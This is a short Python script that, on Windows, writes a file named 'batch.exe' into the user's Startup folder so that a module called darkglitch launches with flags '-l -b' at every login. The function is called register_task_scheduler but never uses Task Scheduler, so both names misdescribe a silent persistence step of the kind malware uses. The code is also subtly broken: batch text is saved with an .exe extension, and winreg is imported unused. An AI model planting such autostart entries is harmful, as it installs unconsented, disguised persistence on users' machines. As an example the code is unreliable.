import sys
import platform
import subprocess
from pathlib import Path

def register_task_scheduler():
    if platform.system() != "Windows":
        print("TASK SCHEDULER REGISTRATION IS WINDOWS-ONLY SKIPPING...")
        return

    try:
        import winreg
        python_exe = sys.executable

        startup_folder = Path.home() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        startup_folder.mkdir(parents=True, exist_ok=True)

        batch_file = startup_folder / "batch.exe"
        batch_content = f'@echo off\nstart "" "{python_exe}" -m darkglitch -l -b'

        batch_file.write_text(batch_content)
        print(f"✅ Created startup batch file: {batch_file}")

    except Exception as e:
        print("Could not register task_scheduler")

if __name__ == "__main__":
    register_task_scheduler()